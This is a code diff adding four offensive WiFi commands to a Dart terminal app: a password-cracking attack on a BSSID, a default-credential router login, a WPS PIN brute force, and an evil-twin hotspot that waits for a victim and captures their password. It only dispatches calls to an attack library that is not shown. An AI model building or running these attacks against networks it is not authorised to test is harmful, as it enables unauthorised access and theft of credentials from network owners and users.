@@ -558,3 +558,65 @@ class TerminalLine {
       }
     }
     break;
+
+  // ==================== أوامر WiFi الحقيقية ====================
+  
+  case 'wifireal':
+    if (args.isEmpty) {
+      result = 'Usage: wifireal <BSSID> [router_ip]\nExample: wifireal 00:11:22:33:44:55 192.168.1.1';
+    } else {
+      final target = args[0];
+      final routerIp = args.length > 1 ? args[1] : null;
+      _addLine('🎯 Starting real attack on $target...');
+      final attackResult = await ZionWiFiReal().fullAttack(target, routerIp: routerIp);
+      if (attackResult.success) {
+        result = '✅ SUCCESS!\n🔑 Password: ${attackResult.password}\n📡 Method: ${attackResult.method}\n⏱️ Duration: ${attackResult.duration.inSeconds}s';
+      } else {
+        result = '❌ FAILED after ${attackResult.duration.inSeconds}s\nNo password found';
+      }
+    }
+    break;
+    
+  case 'routerhack':
+    if (args.isEmpty) {
+      result = 'Usage: routerhack <router_ip>\nExample: routerhack 192.168.1.1';
+    } else {
+      _addLine('🏠 Hacking router ${args[0]}...');
+      final routerResult = await ZionWiFiReal().hackRouterDefaultCredentials(args[0]);
+      if (routerResult.success) {
+        result = '✅ Router hacked!\n👤 Username: ${routerResult.username}\n🔑 Password: ${routerResult.password}\n📶 WiFi Password: ${routerResult.wifiPassword}\n⏱️ Duration: ${routerResult.duration.inSeconds}s';
+      } else {
+        result = '❌ Failed to hack router after ${routerResult.attempts} attempts';
+      }
+    }
+    break;
+    
+  case 'wpsreal':
+    if (args.isEmpty) {
+      result = 'Usage: wpsreal <BSSID>\nExample: wpsreal 00:11:22:33:44:55';
+    } else {
+      _addLine('🔑 Trying WPS PIN attack on ${args[0]}...');
+      final wpsResult = await ZionWiFiReal().hackWPSPin(args[0]);
+      if (wpsResult.success) {
+        result = '✅ WPS PIN found: ${wpsResult.pin}\n⏱️ Duration: ${wpsResult.duration.inSeconds}s\n📊 Attempts: ${wpsResult.attempts}';
+      } else {
+        result = '❌ WPS attack failed after ${wpsResult.attempts} attempts';
+      }
+    }
+    break;
+    
+  case 'eviltwin':
+    if (args.isEmpty) {
+      result = 'Usage: eviltwin <SSID>\nExample: eviltwin MyWiFi';
+    } else {
+      final ssid = args.join(' ');
+      _addLine('🎭 Starting Evil Twin attack on "$ssid"...');
+      _addLine('⚠️ A fake hotspot will be created. Wait for victim to connect.');
+      final evilResult = await ZionWiFiReal().evilTwinAttack(ssid);
+      if (evilResult.success) {
+        result = '✅ Victim connected!\n🔑 Captured password: ${evilResult.capturedPassword}\n⏱️ Duration: ${evilResult.duration.inSeconds}s';
+      } else {
+        result = '❌ Evil Twin attack failed: ${evilResult.error}';
+      }
+    }
+    break;
